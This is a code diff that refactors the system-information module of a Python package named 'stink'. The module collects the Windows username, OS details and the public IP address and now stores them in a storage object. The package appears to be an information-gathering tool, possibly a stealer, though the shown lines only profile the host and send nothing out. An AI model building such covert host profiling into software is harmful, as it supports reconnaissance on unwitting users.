@@ -1,12 +1,12 @@
 import platform
 from os import path
 from json import loads
-from typing import List
 from string import ascii_uppercase
 from urllib.request import urlopen
 from ctypes import windll, sizeof, byref, c_wchar_p
 from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE
 
+from stink.helpers.dataclasses import Data
 from stink.helpers.config import SystemConfig
 from stink.helpers import DisplayDevice, MemoryStatusEx, UlargeInteger, functions, MemoryStorage
 
@@ -150,9 +150,11 @@ class System:
         - str: IP address.
         """
         try:
-            return loads(urlopen(url=self.__config.IPUrl, timeout=3).read().decode("utf-8"))["ip"]
+            ip = loads(urlopen(url=self.__config.IPUrl, timeout=3).read().decode("utf-8"))["ip"]
         except:
-            return "Unknown"
+            ip = "Unknown"
+
+        return ip
 
     def __get_system_info(self) -> None:
         """
@@ -193,7 +195,11 @@ class System:
             )
         )
 
-    def run(self) -> List:
+        self.__storage.add_data("User", self.__config.User)
+        self.__storage.add_data("IP", net_info)
+        self.__storage.add_data("OS", os_info)
+
+    def run(self) -> Data:
         """
         Launches the system data collection module.
 
